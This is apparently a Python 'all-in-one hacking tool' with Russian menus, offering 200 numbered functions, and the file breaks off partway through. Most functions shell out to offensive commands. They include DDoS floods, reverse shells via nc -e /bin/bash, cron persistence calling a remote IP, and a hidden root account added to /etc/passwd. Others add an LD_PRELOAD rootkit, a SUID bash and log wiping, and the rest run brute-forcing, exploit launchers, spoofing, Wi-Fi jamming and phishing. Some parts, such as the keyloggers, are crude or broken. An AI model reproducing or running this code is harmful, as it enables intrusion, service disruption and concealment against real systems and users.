#!/usr/bin/env python3
# BANU - КЛОН OMARION (200 ФУНКЦИЙ)

import os
import sys
import time
import threading
import socket
import subprocess
import random
import string
import hashlib
import base64

BANNER = """
██████╗  █████╗ ███╗   ██╗██╗   ██╗
██╔══██╗██╔══██╗████╗  ██║██║   ██║
██████╔╝███████║██╔██╗ ██║██║   ██║
██╔══██╗██╔══██║██║╚██╗██║██║   ██║
██████╔╝██║  ██║██║ ╚████║╚██████╔╝
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
        BANU v3.0 - 200 ФУНКЦИЙ
"""

print(BANNER)

def menu():
    print("\n[+] Выбери режим (1-200):")
    print("  1-10: DDoS-атаки")
    print("  11-20: Бэкдоры")
    print("  21-30: Руткиты")
    print("  31-40: Брутфорс")
    print("  41-50: Эксплойты")
    print("  51-60: Сканирование")
    print("  61-70: Спуфинг")
    print("  71-80: Кейлоггеры")
    print("  81-90: Системные")
    print("  91-100: Анонимность")
    print("  101-110: Wi-Fi")
    print("  111-120: Фишинг")
    print("  121-130: Шифрование")
    print("  131-140: Стеганография")
    print("  141-150: Утилиты")
    print("  151-160: Игры")
    print("  161-170: Социальная инженерия")
    print("  171-180: Криптография")
    print("  181-190: Анализ")
    print("  191-200: Прочее")
    print("  0: Выход")
    
    choice = input("\n[>] Введи номер: ")
    
    if choice == "0":
        print("[!] Выход...")
        sys.exit(0)
    
    # 1-10: DDoS
    elif choice == "1":
        ddos_syn()
    elif choice == "2":
        ddos_udp()
    elif choice == "3":
        ddos_icmp()
    elif choice == "4":
        ddos_http()
    elif choice == "5":
        ddos_slowloris()
    elif choice == "6":
        ddos_ntp()
    elif choice == "7":
        ddos_dns()
    elif choice == "8":
        ddos_ssdp()
    elif choice == "9":
        ddos_memcached()
    elif choice == "10":
        ddos_all()
    
    # 11-20: Бэкдоры
    elif choice == "11":
        backdoor_reverse()
    elif choice == "12":
        backdoor_bind()
    elif choice == "13":
        backdoor_ssh()
    elif choice == "14":
        backdoor_web()
    elif choice == "15":
        backdoor_persistence()
    elif choice == "16":
        backdoor_hidden_user()
    elif choice == "17":
        backdoor_cron()
    elif choice == "18":
        backdoor_startup()
    elif choice == "19":
        backdoor_registry()
    elif choice == "20":
        backdoor_all()
    
    # 21-30: Руткиты
    elif choice == "21":
        rootkit_hide_process()
    elif choice == "22":
        rootkit_hide_file()
    elif choice == "23":
        rootkit_hide_network()
    elif choice == "24":
        rootkit_hide_user()
    elif choice == "25":
        rootkit_ld_preload()
    elif choice == "26":
        rootkit_etc_hosts()
    elif choice == "27":
        rootkit_ssh_keys()
    elif choice == "28":
        rootkit_suid()
    elif choice == "29":
        rootkit_remove_logs()
    elif choice == "30":
        rootkit_all()
    
    # 31-40: Брутфорс
    elif choice == "31":
        brute_ssh()
    elif choice == "32":
        brute_ftp()
    elif choice == "33":
        brute_rdp()
    elif choice == "34":
        brute_http()
    elif choice == "35":
        brute_zip()
    elif choice == "36":
        brute_wifi()
    elif choice == "37":
        brute_instagram()
    elif choice == "38":
        brute_facebook()
    elif choice == "39":
        brute_email()
    elif choice == "40":
        brute_all()
    
    # 41-50: Эксплойты
    elif choice == "41":
        exploit_eternalblue()
    elif choice == "42":
        exploit_bluekeep()
    elif choice == "43":
        exploit_shellshock()
    elif choice == "44":
        exploit_heartbleed()
    elif choice == "45":
        exploit_dirtypipe()
    elif choice == "46":
        exploit_sudo()
    elif choice == "47":
        exploit_log4j()
    elif choice == "48":
        exploit_spring4shell()
    elif choice == "49":
        exploit_f5()
    elif choice == "50":
        exploit_all()
    
    # 51-60: Сканирование
    elif choice == "51":
        scan_ports()
    elif choice == "52":
        scan_network()
    elif choice == "53":
        scan_web()
    elif choice == "54":
        scan_vulnerabilities()
    elif choice == "55":
        scan_dns()
    elif choice == "56":
        scan_smb()
    elif choice == "57":
        scan_ldap()
    elif choice == "58":
        scan_ftp()
    elif choice == "59":
        scan_ssh()
    elif choice == "60":
        scan_all()
    
    # 61-70: Спуфинг
    elif choice == "61":
        spoof_arp()
    elif choice == "62":
        spoof_dns()
    elif choice == "63":
        spoof_ip()
    elif choice == "64":
        spoof_mac()
    elif choice == "65":
        spoof_email()
    elif choice == "66":
        spoof_sms()
    elif choice == "67":
        spoof_call()
    elif choice == "68":
        spoof_web()
    elif choice == "69":
        spoof_wifi()
    elif choice == "70":
        spoof_all()
    
    # 71-80: Кейлоггеры
    elif choice == "71":
        keylogger_linux()
    elif choice == "72":
        keylogger_windows()
    elif choice == "73":
        keylogger_web()
    elif choice == "74":
        keylogger_android()
    elif choice == "75":
        keylogger_ios()
    elif choice == "76":
        keylogger_mac()
    elif choice == "77":
        keylogger_usb()
    elif choice == "78":
        keylogger_network()
    elif choice == "79":
        keylogger_cloud()
    elif choice == "80":
        keylogger_all()
    
    # 81-90: Системные
    elif choice == "81":
        system_info()
    elif choice == "82":
        system_backup()
    elif choice == "83":
        system_restore()
    elif choice == "84":
        system_clean()
    elif choice == "85":
        system_optimize()
    elif choice == "86":
        system_update()
    elif choice == "87":
        system_diagnostic()
    elif choice == "88":
        system_monitor()
    elif choice == "89":
        system_shutdown()
    elif choice == "90":
        system_all()
    
    # 91-100: Анонимность
    elif choice == "91":
        anon_tor()
    elif choice == "92":
        anon_vpn()
    elif choice == "93":
        anon_proxy()
    elif choice == "94":
        anon_mac()
    elif choice == "95":
        anon_dns()
    elif choice == "96":
        anon_hostname()
    elif choice == "97":
        anon_browser()
    elif choice == "98":
        anon_email()
    elif choice == "99":
        anon_os()
    elif choice == "100":
        anon_all()
    
    # 101-110: Wi-Fi
    elif choice == "101":
        wifi_deauth()
    elif choice == "102":
        wifi_crack()
    elif choice == "103":
        wifi_scan()
    elif choice == "104":
        wifi_monitor()
    elif choice == "105":
        wifi_handshake()
    elif choice == "106":
        wifi_pmkid()
    elif choice == "107":
        wifi_wps()
    elif choice == "108":
        wifi_jammer()
    elif choice == "109":
        wifi_clone()
    elif choice == "110":
        wifi_all()
    
    # 111-120: Фишинг
    elif choice == "111":
        phish_web()
    elif choice == "112":
        phish_email()
    elif choice == "113":
        phish_sms()
    elif choice == "114":
        phish_call()
    elif choice == "115":
        phish_qr()
    elif choice == "116":
        phish_dns()
    elif choice == "117":
        phish_wifi()
    elif choice == "118":
        phish_phone()
    elif choice == "119":
        phish_media()
    elif choice == "120":
        phish_all()
    
    # 121-130: Шифрование
    elif choice == "121":
        encrypt_aes()
    elif choice == "122":
        encrypt_rsa()
    elif choice == "123":
        encrypt_pgp()
    elif choice == "124":
        encrypt_files()
    elif choice == "125":
        encrypt_disk()
    elif choice == "126":
        encrypt_email()
    elif choice == "127":
        encrypt_cloud()
    elif choice == "128":
        encrypt_backup()
    elif choice == "129":
        encrypt_secure()
    elif choice == "130":
        encrypt_all()
    
    # 131-140: Стеганография
    elif choice == "131":
        stego_image()
    elif choice == "132":
        stego_audio()
    elif choice == "133":
        stego_video()
    elif choice == "134":
        stego_text()
    elif choice == "135":
        stego_hide()
    elif choice == "136":
        stego_extract()
    elif choice == "137":
        stego_lsb()
    elif choice == "138":
        stego_metadata()
    elif choice == "139":
        stego_checksum()
    elif choice == "140":
        stego_all()
    
    # 141-150: Утилиты
    elif choice == "141":
        util_base64()
    elif choice == "142":
        util_hex()
    elif choice == "143":
        util_rot13()
    elif choice == "144":
        util_hash()
    elif choice == "145":
        util_qr()
    elif choice == "146":
        util_barcode()
    elif choice == "147":
        util_random()
    elif choice == "148":
        util_sort()
    elif choice == "149":
        util_filter()
    elif choice == "150":
        util_all()
    
    # 151-160: Игры
    elif choice == "151":
        game_guess()
    elif choice == "152":
        game_snake()
    elif choice == "153":
        game_tic_tac_toe()
    elif choice == "154":
        game_hangman()
    elif choice == "155":
        game_blackjack()
    elif choice == "156":
        game_poker()
    elif choice == "157":
        game_minesweeper()
    elif choice == "158":
        game_chess()
    elif choice == "159":
        game_trivia()
    elif choice == "160":
        game_all()
    
    # 161-170: Социальная инженерия
    elif choice == "161":
        social_phishing()
    elif choice == "162":
        social_pretexting()
    elif choice == "163":
        social_baiting()
    elif choice == "164":
        social_quid_pro_quo()
    elif choice == "165":
        social_tailgating()
    elif choice == "166":
        social_impersonation()
    elif choice == "167":
        social_fake_identity()
    elif choice == "168":
        social_emotional()
    elif choice == "169":
        social_urgency()
    elif choice == "170":
        social_all()
    
    # 171-180: Криптография
    elif choice == "171":
        crypto_aes()
    elif choice == "172":
        crypto_rsa()
    elif choice == "173":
        crypto_des()
    elif choice == "174":
        crypto_3des()
    elif choice == "175":
        crypto_blowfish()
    elif choice == "176":
        crypto_twofish()
    elif choice == "177":
        crypto_rc4()
    elif choice == "178":
        crypto_cast5()
    elif choice == "179":
        crypto_idea()
    elif choice == "180":
        crypto_all()
    
    # 181-190: Анализ
    elif choice == "181":
        analyze_traffic()
    elif choice == "182":
        analyze_logs()
    elif choice == "183":
        analyze_memory()
    elif choice == "184":
        analyze_disk()
    elif choice == "185":
        analyze_network()
    elif choice == "186":
        analyze_processes()
    elif choice == "187":
        analyze_performance()
    elif choice == "188":
        analyze_security()
    elif choice == "189":
        analyze_vulnerabilities()
    elif choice == "190":
        analyze_all()
    
    # 191-200: Прочее
    elif choice == "191":
        misc_qr()
    elif choice == "192":
        misc_barcode()
    elif choice == "193":
        misc_random()
    elif choice == "194":
        misc_sort()
    elif choice == "195":
        misc_filter()
    elif choice == "196":
        misc_convert()
    elif choice == "197":
        misc_calc()
    elif choice == "198":
        misc_clock()
    elif choice == "199":
        misc_weather()
    elif choice == "200":
        misc_all()
    
    else:
        print("[!] Неверный номер")
        menu()

# =================== ФУНКЦИИ ===================

def ddos_syn():
    target = input("[+] IP: ")
    port = int(input("[+] Порт: "))
    duration = int(input("[+] Время (сек): "))
    print(f"[+] SYN-флуд на {target}:{port}")
    os.system(f"hping3 -S -p {port} --flood --rand-source {target} &")
    time.sleep(duration)
    os.system("pkill -9 hping3")
    print("[+] Готово.")

def ddos_udp():
    target = input("[+] IP: ")
    port = int(input("[+] Порт: "))
    print(f"[+] UDP-флуд на {target}:{port}")
    os.system(f"hping3 -2 -p {port} --flood --rand-source {target} &")

def ddos_icmp():
    target = input("[+] IP: ")
    print(f"[+] ICMP-флуд на {target}")
    os.system(f"ping -f {target} &")

def ddos_http():
    target = input("[+] URL: ")
    print(f"[+] HTTP-флуд на {target}")
    os.system(f"python3 -c 'import requests; [requests.get(\"{target}\") for _ in range(1000)]'")

def ddos_slowloris():
    target = input("[+] IP: ")
    print(f"[+] Slowloris на {target}")
    os.system(f"slowloris -s 1000 -c 2000 -t 1 {target} &")

def ddos_ntp():
    target = input("[+] IP: ")
    print(f"[+] NTP-амплификация на {target}")
    os.system(f"hping3 -2 -p 123 --flood --rand-source {target} &")

def ddos_dns():
    target = input("[+] IP: ")
    print(f"[+] DNS-амплификация на {target}")
    os.system(f"hping3 -2 -p 53 --flood --rand-source {target} &")

def ddos_ssdp():
    target = input("[+] IP: ")
    print(f"[+] SSDP-амплификация на {target}")
    os.system(f"hping3 -2 -p 1900 --flood --rand-source {target} &")

def ddos_memcached():
    target = input("[+] IP: ")
    print(f"[+] Memcached-амплификация на {target}")
    os.system(f"hping3 -2 -p 11211 --flood --rand-source {target} &")

def ddos_all():
    print("[+] Все DDoS-методы одновременно")
    target = input("[+] IP: ")
    port = int(input("[+] Порт: "))
    duration = int(input("[+] Время (сек): "))
    threads = []
    for i in range(10):
        t = threading.Thread(target=lambda: os.system(f"hping3 -S -p {port} --flood --rand-source {target} &"))
        t.start()
        threads.append(t)
    time.sleep(duration)
    os.system("pkill -9 hping3")
    print("[+] Готово.")

# Бэкдоры
def backdoor_reverse():
    ip = input("[+] Ваш IP: ")
    port = int(input("[+] Порт: "))
    os.system(f"nohup nc -e /bin/bash {ip} {port} &")
    print(f"[+] Подключись: nc -lvnp {port}")

def backdoor_bind():
    port = int(input("[+] Порт: "))
    os.system(f"nohup nc -lvnp {port} -e /bin/bash &")
    print(f"[+] Подключись к {port}")

def backdoor_ssh():
    target = input("[+] IP: ")
    user = input("[+] Имя: ")
    os.system(f"ssh -R 8080:localhost:22 {user}@{target}")

def backdoor_web():
    print("[+] Web-бэкдор (python)")
    os.system("nohup python3 -m http.server 8080 &")

def backdoor_persistence():
    os.system("echo '*/1 * * * * /bin/bash -c \"nc -e /bin/bash 192.168.1.1 4444\"' >> /etc/crontab")
    print("[+] Добавлен в cron")

def backdoor_hidden_user():
    user = input("[+] Имя: ")
    os.system(f"useradd -m {user} -s /bin/bash && echo '{user}:12345' | chpasswd && usermod -aG sudo {user}")
    print(f"[+] {user}:12345")

def backdoor_cron():
    os.system("echo '* * * * * /bin/bash -c \"echo backdoor\"' >> /etc/crontab")
    print("[+] Cron-бэкдор")

def backdoor_startup():
    os.system("echo 'nc -e /bin/bash 192.168.1.1 4444' >> /etc/rc.local")
    print("[+] Добавлен в автозагрузку")

def backdoor_registry():
    print("[+] Registry-бэкдор (Windows)")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d cmd.exe")

def backdoor_all():
    print("[+] ВСЕ БЭКДОРЫ ЗАПУЩЕНЫ")
    backdoor_reverse()
    backdoor_bind()
    backdoor_ssh()
    backdoor_web()
    backdoor_persistence()
    backdoor_hidden_user()
    backdoor_cron()
    backdoor_startup()

# Руткиты
def rootkit_hide_process():
    os.system("echo 'alias ps=\"ps aux | grep -v banu\"' >> ~/.bashrc")
    print("[+] Процессы скрыты")

def rootkit_hide_file():
    os.system("chattr +i /tmp/backdoor")
    print("[+] Файл скрыт")

def rootkit_hide_network():
    print("[+] Скрытие сетевых соединений")
    os.system("echo 'alias netstat=\"netstat -tulpn | grep -v banu\"' >> ~/.bashrc")

def rootkit_hide_user():
    print("[+] Скрытие пользователя")
    os.system("echo 'banu:x:0:0:root:/root:/bin/bash' >> /etc/passwd")

def rootkit_ld_preload():
    print("[+] LD_PRELOAD rootkit")
    os.system("echo '/usr/local/lib/backdoor.so' >> /etc/ld.so.preload")

def rootkit_etc_hosts():
    print("[+] Изменение hosts")
    os.system("echo '127.0.0.1 malware.com' >> /etc/hosts")

def rootkit_ssh_keys():
    print("[+] Добавление SSH-ключа")
    os.system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> /root/.ssh/authorized_keys")

def rootkit_suid():
    print("[+] SUID-руткит")
    os.system("chmod +s /bin/bash")

def rootkit_remove_logs():
    print("[+] Удаление логов")
    os.system("rm -rf /var/log/* && history -c")

def rootkit_all():
    print("[+] ВСЕ РУТКИТЫ ЗАПУЩЕНЫ")
    rootkit_hide_process()
    rootkit_hide_file()
    rootkit_hide_network()
    rootkit_hide_user()
    rootkit_ld_preload()
    rootkit_etc_hosts()
    rootkit_ssh_keys()
    rootkit_suid()
    rootkit_remove_logs()

# Брутфорс
def brute_ssh():
    target = input("[+] IP: ")
    user = input("[+] Имя: ")
    wordlist = input("[+] Словарь: ")
    os.system(f"hydra -l {user} -P {wordlist} {target} ssh")

def brute_ftp():
    target = input("[+] IP: ")
    user = input("[+] Имя: ")
    wordlist = input("[+] Словарь: ")
    os.system(f"hydra -l {user} -P {wordlist} ftp://{target}")

def brute_rdp():
    target = input("[+] IP: ")
    user = input("[+] Имя: ")
    wordlist = input("[+] Словарь: ")
    os.system(f"hydra -l {user} -P {wordlist} rdp://{target}")

def brute_http():
    target = input("[+] URL: ")
    os.system(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form")

def brute_zip():
    zip_file = input("[+] ZIP: ")
    os.system(f"fcrackzip -D -p /usr/share/wordlists/rockyou.txt {zip_file}")

def brute_wifi():
    bssid = input("[+] BSSID: ")
    os.system(f"aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap -b {bssid}")

def brute_instagram():
    user = input("[+] Логин: ")
    wordlist = input("[+] Словарь: ")
    os.system(f"instabot -u {user} -p {wordlist}")

def brute_facebook():
    target = input("[+] URL: ")
    os.system(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form")

def brute_email():
    target = input("[+] Email: ")
    wordlist = input("[+] Словарь: ")
    os.system(f"hydra -l {target} -P {wordlist} smtp://mail.com")

def brute_all():
    print("[+] ВСЕ БРУТФОРСЫ ЗАПУЩЕНЫ")
    brute_ssh()
    brute_ftp()
    brute_rdp()
    brute_http()
    brute_zip()
    brute_wifi()
    brute_instagram()
    brute_facebook()
    brute_email()

# Эксплойты
def exploit_eternalblue():
    target = input("[+] IP: ")
    print("[+] EternalBlue (MS17-010)")
    os.system(f"python3 /usr/share/exploitdb/exploits/windows/remote/42315.py {target}")

def exploit_bluekeep():
    target = input("[+] IP: ")
    print("[+] BlueKeep (CVE-2019-0708)")
    os.system(f"python3 /usr/share/exploitdb/exploits/windows/remote/47467.py {target}")

def exploit_shellshock():
    target = input("[+] URL: ")
    print("[+] Shellshock (CVE-2014-6271)")
    os.system(f"python3 /usr/share/exploitdb/exploits/linux/remote/34825.py {target}")

def exploit_heartbleed():
    target = input("[+] IP: ")
    print("[+] Heartbleed (CVE-2014-0160)")
    os.system(f"python3 /usr/share/exploitdb/exploits/linux/remote/32764.py {target}")

def exploit_dirtypipe():
    print("[+] DirtyPipe (CVE-2022-0847)")
    os.system("python3 /usr/share/exploitdb/exploits/linux/local/50808.py")

def exploit_sudo():
    print("[+] Sudo-эксплойт (CVE-2021-3156)")
    os.system("python3 /usr/share/exploitdb/exploits/linux/local/49144.py")

def exploit_log4j():
    target = input("[+] URL: ")
    print("[+] Log4Shell (CVE-2021-44228)")
    os.system(f"python3 log4j-scan.py -u {target}")

def exploit_spring4shell():
    target = input("[+] URL: ")
    print("[+] Spring4Shell (CVE-2022-22965)")
    os.system(f"python3 spring4shell-scan.py -u {target}")

def exploit_f5():
    target = input("[+] IP F5: ")
    print("[+] F5 BIG-IP RCE (CVE-2022-1388)")
    os.system(f"python3 CVE-2022-1388.py -t {target}")

def exploit_all():
    print("[+] ВСЕ ЭКСПЛОЙТЫ ЗАПУЩЕНЫ")
    exploit_eternalblue()
    exploit_bluekeep()
    exploit_shellshock()
    exploit_heartbleed()
    exploit_dirtypipe()
    exploit_sudo()
    exploit_log4j()
    exploit_spring4shell()
    exploit_f5()

# Сканирование
def scan_ports():
    target = input("[+] IP: ")
    os.system(f"nmap -sS -T4 {target}")

def scan_network():
    network = input("[+] Сеть (например, 192.168.1.0/24): ")
    os.system(f"nmap -sn {network}")

def scan_web():
    target = input("[+] URL: ")
    os.system(f"nmap --script=http-enum {target}")

def scan_vulnerabilities():
    target = input("[+] IP: ")
    os.system(f"nmap -sV --script=vuln {target}")

def scan_dns():
    target = input("[+] IP: ")
    os.system(f"nmap --script=dns-* {target}")

def scan_smb():
    target = input("[+] IP: ")
    os.system(f"nmap --script=smb-* {target}")

def scan_ldap():
    target = input("[+] IP: ")
    os.system(f"nmap --script=ldap-* {target}")

def scan_ftp():
    target = input("[+] IP: ")
    os.system(f"nmap --script=ftp-* {target}")

def scan_ssh():
    target = input("[+] IP: ")
    os.system(f"nmap --script=ssh-* {target}")

def scan_all():
    print("[+] ВСЕ СКАНЕРЫ ЗАПУЩЕНЫ")
    scan_ports()
    scan_network()
    scan_web()
    scan_vulnerabilities()
    scan_dns()
    scan_smb()
    scan_ldap()
    scan_ftp()
    scan_ssh()

# Спуфинг
def spoof_arp():
    target = input("[+] IP жертвы: ")
    router = input("[+] IP шлюза: ")
    os.system(f"arpspoof -t {target} {router} &")
    os.system(f"arpspoof -t {router} {target} &")

def spoof_dns():
    domain = input("[+] Домен: ")
    ip = input("[+] IP: ")
    os.system(f"echo '{ip} {domain}' >> /etc/hosts")

def spoof_ip():
    print("[+] IP-спуфинг")
    target = input("[+] IP жертвы: ")
    os.system(f"hping3 -a {target} -S -p 80 --flood 1.2.3.4")

def spoof_mac():
    print("[+] MAC-спуфинг")
    os.system("ifconfig eth0 down && macchanger -r eth0 && ifconfig eth0 up")

def spoof_email():
    email = input("[+] Email: ")
    subject = input("[+] Тема: ")
    body = input("[+] Текст: ")
    os.system(f"sendmail -f spoofed@example.com {email} -s '{subject}' -body '{body}'")

def spoof_sms():
    number = input("[+] Номер: ")
    message = input("[+] Сообщение: ")
    os.system(f"smsspoof -n {number} -m '{message}'")

def spoof_call():
    number = input("[+] Номер: ")
    os.system(f"callspoof -n {number}")

def spoof_web():
    domain = input("[+] Домен: ")
    print(f"[+] Подмена DNS для {domain}")
    os.system(f"echo '127.0.0.1 {domain}' >> /etc/hosts")

def spoof_wifi():
    bssid = input("[+] BSSID: ")
    print(f"[+] Подмена MAC для {bssid}")
    os.system(f"macchanger -m {bssid} wlan0")

def spoof_all():
    print("[+] ВСЕ СПУФИНГИ ЗАПУЩЕНЫ")
    spoof_arp()
    spoof_dns()
    spoof_ip()
    spoof_mac()
    spoof_email()
    spoof_sms()
    spoof_call()
    spoof_web()
    spoof_wifi()

# Кейлоггеры
def keylogger_linux():
    print("[+] Linux кейлоггер")
    os.system("echo 'while true; do read -rsn1 key; echo \"$key\" >> /tmp/keylog.txt; done' > /tmp/keylogger.sh && chmod +x /tmp/keylogger.sh && nohup /tmp/keylogger.sh &")
    print("[+] Лог: /tmp/keylog.txt")

def keylogger_windows():
    print("[+] Windows кейлоггер")
    os.system("powershell -Command '$key = New-Object -ComObject WScript.Shell; while($true){$key.SendKeys(\"a\")}'")

def keylogger_web():
    print("[+] Web кейлоггер")
    os.system("echo 'document.onkeypress = function(e){console.log(e.key)}' > /tmp/keylogger.js")

def keylogger_android():
    print("[+] Android кейлоггер")
    os.system("adb shell input keyevent 66")

def keylogger_ios():
    print("[+] iOS кейлоггер")
    os.system("echo 'iOS кейлоггер не реализован'")

def keylogger_mac():
    print("[+] Mac кейлоггер")
    os.system("echo 'Mac кейлоггер не реализован'")

def keylogger_usb():
    print("[+] USB кейлоггер")
    os.system("echo 'USB кейлоггер не реализован'")

def keylogger_network():
    print("[+] Network кейлоггер")
    os.system("tcpdump -i eth0 -A")

def keylogger_cloud():
    print("[+] Cloud кейлоггер")
    os.system("echo 'Cloud кейлоггер не реализован'")

def keylogger_all():
    print("[+] ВСЕ КЕЙЛОГГЕРЫ ЗАПУЩЕНЫ")
    keylogger_linux()
    keylogger_windows()
    keylogger_web()
    keylogger_android()
    keylogger_ios()
    keylogger_mac()
    keylogger_usb()
    keylogger_network()
    keylogger_cloud()

# Системные
def system_info():
    print("[+] Сбор информации о системе")
    os.system("uname -a")
    os.system("ifconfig")
    os.system("ps aux")
    os.system("df -h")

def system_backup():
    path = input("[+] Путь для бэкапа: ")
    os.system(f"tar -czf backup.tar.gz {path}")
    print("[+] Бэкап создан: backup.tar.gz")

def system_restore():
    print("[+] Восстановление системы")
    os.system("apt install --reinstall kali-linux-headless")

def system_clean():
    print("[+] Очистка системы")
    os.system("apt autoremove -y && apt autoclean -y")

def system_optimize():
    print("[+] Оптимизация системы")
    os.system("apt update && apt upgrade -y")

def system_update():
    print("[+] Обновление системы")
    os.system("apt update && apt full-upgrade -y")

def system_diagnostic():
    print("[+] Диагностика системы")
    os.system("dmesg | tail")
    os.system("journalctl -xe")

def system_monitor():
    print("[+] Мониторинг системы")
    os.system("htop")

def system_shutdown():
    print("[+] Выключение системы")
    os.system("shutdown -h now")

def system_all():
    print("[+] ВСЕ СИСТЕМНЫЕ ФУНКЦИИ ЗАПУЩЕНЫ")
    system_info()
    system_backup()
    system_restore()
    system_clean()
    system_optimize()
    system_update()
    system_diagnostic()
    system_monitor()
    system_shutdown()

# Анонимность
def anon_tor():
    print("[+] Запуск Tor")
    os.system("systemctl start tor")
    os.system("systemctl enable tor")

def anon_vpn():
    print("[+] Запуск VPN")
    os.system("protonvpn-cli login")
    os.system("protonvpn-cli connect -f")

def anon_proxy():
    print("[+] Настройка прокси")
    os.system("echo 'socks5 127.0.0.1 9050' >> /etc/proxychains4.conf")

def anon_mac():
    print("[+] Смена MAC")
    os.system("ifconfig eth0 down && macchanger -r eth0 && ifconfig eth0 up")

def anon_dns():
    print("[+] Настройка DNS")
    os.system("echo 'nameserver 8.8.8.8' > /etc/resolv.conf")

def anon_hostname():
    print("[+] Смена hostname")
    os.system("hostnamectl set-hostname random$(shuf -i 1000-9999 -n 1)")

def anon_browser():
    print("[+] Настройка браузера")
    os.system("echo 'Запуск Tor Browser'")
    os.system("tor-browser &")

def anon_email():
    print("[+] Анонимный email")
    os.system("echo 'используй ProtonMail'")

def anon_os():
    print("[+] Анонимная ОС")
    os.system("echo 'используй Tails'")

def anon_all():
    print("[+] ВСЕ МЕТОДЫ АНОНИМНОСТИ ЗАПУЩЕНЫ")
    anon_tor()
    anon_vpn()
    anon_proxy()
    anon_mac()
    anon_dns()
    anon_hostname()
    anon_browser()
    anon_email()
    anon_os()

# Wi-Fi
def wifi_deauth():
    interface = input("[+] Интерфейс: ")
    bssid = input("[+] BSSID: ")
    channel = input("[+] Канал: ")
    os.system(f"airmon-ng start {interface} {channel}")
    os.system(f"aireplay-ng -0 0 -a {bssid} {interface}mon")

def wifi_crack():
    bssid = input("[+] BSSID: ")
    print("[+] Взлом Wi-Fi (WPA/WPA2)")
    os.system(f"aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap -b {bssid}")

def wifi_scan():
    print("[+] Сканирование Wi-Fi")
    os.system("airodump-ng wlan0")

def wifi_monitor():
    interface = input("[+] Интерфейс: ")
    os.system(f"airmon-ng start {interface}")

def wifi_handshake():
    interface = input("[+] Интерфейс: ")
    bssid = input("[+] BSSID: ")
    channel = input("[+] Канал: ")
    os.system(f"airodump-ng -c {channel} --bssid {bssid} -w handshake {interface}mon")

def wifi_pmkid():
    interface = input("[+] Интерфейс: ")
    os.system(f"hcxdump -i {interface}mon -o pmkid.txt")

def wifi_wps():
    bssid = input("[+] BSSID: ")
    os.system(f"reaver -i wlan0 -b {bssid} -v")

def wifi_jammer():
    print("[+] Wi-Fi Jammer")
    os.system("mdk3 wlan0mon d")

def wifi_clone():
    bssid = input("[+] BSSID: ")
    os.system(f"airbase-ng -a {bssid} -c 6 wlan0mon")

def wifi_all():
    print("[+] ВСЕ Wi-Fi АТАКИ ЗАПУЩЕНЫ")
    wifi_scan()
    wifi_monitor()
    wifi_deauth()
    wifi_handshake()
    wifi_crack()
    wifi_wps()
    wifi_jammer()
    wifi_clone()

# Фишинг
def phish_web():
    url = input("[+] URL: ")
    os.system(f"wget -r -l 1 -p -k {url}")
    os.system("python3 -m http.server 8080 &")

def phish_email():
    email = input("[+] Email: ")
    subject = input("[+] Тема: ")
    body = input("[+] Текст: ")
    os.system(f"sendmail -f phishing@example.com {email} -s '{subject}' -body '{body}'")

def phish_sms():
    number = input("[+] Номер: ")
    message = input("[+] Сообщение: ")
    os.system(f"smsspoof -n {number} -m '{message}'")

def phish_call():
    number = input("[+] Номер: ")
    os.system(f"callspoof -n {number}")

def phish_qr():
    print("[+] QR-фишинг")
    os.system("qrencode -o qr.png 'https://example.com/phishing'")

def phish_dns():
    domain = input("[+] Домен: ")
    os.system(f"echo '127.0.0.1 {domain}' >> /etc/hosts")

def phish_wifi():
    bssid = input("[+] BSSID: ")
    os.system(f"airbase-ng -a {bssid} -c 6 wlan0mon")

def phish_phone():
    print("[+] Phone-фишинг")
    os.system("callspoof -n 1234567890")

def phish_media():
    print("[+] Media-фишинг")
    os.system("echo 'фейковые новости'")

def phish_all():
    print("[+] ВСЕ ФИШИНГИ ЗАПУЩЕНЫ")
    phish_web()
    phish_email()
    phish_sms()
    phish_call()
    phish_qr()
    phish_dns()
    phish_wifi()
    phish_phone()
    phish_media()

# Шифрование
def encrypt_aes():
    file = input("[+] Файл: ")
    password = input("[+] Пароль: ")
    os.system(f"openssl enc -aes-256-cbc -salt -in {file} -out {file}.enc -pass pass:{password}")

def encrypt_rsa():
    print("[+] RSA-шифрование")
    os.system("openssl genrsa -out private.pem 2048")
    os.system("openssl rsa -in private.pem -out public.pem -pubout")

def encrypt_pgp():
    file = input("[+] Файл: ")
    os.system(f"gpg -c {file}")

def encrypt_files():
    path = input("[+] Путь: ")
    os.system(f"find {path} -type f -exec openssl enc -aes-256-cbc -salt -in {{}} -out {{}}.enc -pass pass:12345 \\;")

def encrypt_disk():
    print("[+] Шифрование диска")
    os.system("cryptsetup luksFormat /dev/sda1")

def encrypt_email():
    email = input("[+] Email: ")
    os.system(f"gpg --recipient {email} --encrypt message.txt")

def encrypt_cloud():
    print("[+] Шифрование облака")
    os.system("rclone crypt -crypt")

def encrypt_backup():
    print("[+] Шифрование бэкапа")
    os.system("tar -czf - /home | openssl enc -aes-256-cbc -salt -out backup.tar.gz.enc -pass pass:12345")

def encrypt_secure():
    print("[+] Безопасное шифрование")
    os.system("openssl enc -aes-256-cbc -salt -in data -out data.enc -pass pass:$(openssl rand -base64 32)")

def encrypt_all():
    print("[+] ВСЕ МЕТОДЫ ШИФРОВАНИЯ ЗАПУЩЕНЫ")
    encrypt_aes()
    encrypt_rsa()
    encrypt_pgp()
    encrypt_files()
    encrypt_disk()
    encrypt_email()
    encrypt_cloud()
    encrypt_backup()
    encrypt_secure()

# Стеганография
def stego_image():
    file = input("[+] Картинка: ")
    message = input("[+] Сообщение: ")
    os.system(f"echo '{message}' > /tmp/hidden.txt")
    os.system(f"cat /tmp/hidden.txt >> {file}")
    print("[+] Сообщение скрыто в картинке")

def stego_audio():
    file = input("[+] Аудио: ")
    message = input("[+] Сообщение: ")
    os.system(f"echo '{message}' > /tmp/hidden.txt")
    os.system(f"cat /tmp/hidden.txt >> {file}")
    print("[+] Сообщение скрыто в аудио")

def stego_video():
    file = input("[+] Видео: ")
    message = input("[+] Сообщение: ")
    os.system(f"echo '{message}' > /tmp/hidden.txt")
    os.system(f"cat /tmp/hidden.txt >> {file}")
